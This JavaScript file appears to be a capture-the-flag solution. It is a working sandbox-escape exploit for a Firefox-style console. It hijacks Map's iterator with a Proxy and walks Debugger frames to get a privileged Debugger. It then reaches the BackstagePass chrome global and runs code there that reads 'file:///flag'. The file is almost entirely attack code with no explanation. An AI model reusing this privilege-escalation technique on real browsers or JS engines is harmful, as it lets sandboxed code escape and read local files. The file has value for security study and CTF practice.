/* eslint-disable no-caller, object-shorthand */ // Needs both for exploit
const debuggerObj = new Debugger();
debuggerObj.addDebuggee(window);

const map = new Map([[{}, {}]]);
const origiter = Object.getPrototypeOf(map)[Symbol.iterator];

map[Symbol.iterator] = new Proxy(() => {}, {
  apply: function(target, thisarg, arglist) {
    map[Symbol.iterator] = origiter;

    const sandbox = arguments.callee.caller.constructor('return globalThis')();
    debuggerObj.addDebuggee(sandbox);

    let frame = debuggerObj.getNewestFrame();
    for (let i = 0; frame; i++) {
      if (frame.script.displayName === 'formatMap') {
        break;
      }
      frame = frame.older;
    }

    const getvar = function(env, name) {
      return env.find(name).getVariable(name);
    };
    const getPromiseDetails = getvar(frame.environment, 'getPromiseDetails');
    const deref = getvar(getPromiseDetails.environment, 'deref');
    const Debugger = getvar(deref.environment, 'Debugger').unsafeDereference();

    const debuggerEverywhereObj = new Debugger();

    let BackstagePass;
    for (BackstagePass of debuggerEverywhereObj.findAllGlobals()) {
      if (BackstagePass.class === 'BackstagePass') {
        break;
      }
    }

    BackstagePass.executeInGlobal(
      '(' +
        async function() {
          Cu.importGlobalProperties(['fetch']);

          const { inspect } = ChromeUtils.import('resource:///modules/ConsoleObserver.jsm');

          const response = await fetch('file:///flag');
          const data = await response.text();
          inspect(data, false, globalThis);
        } +
        ')()'
    );

    return origiter.apply(thisarg, arglist);
  },
});
map;
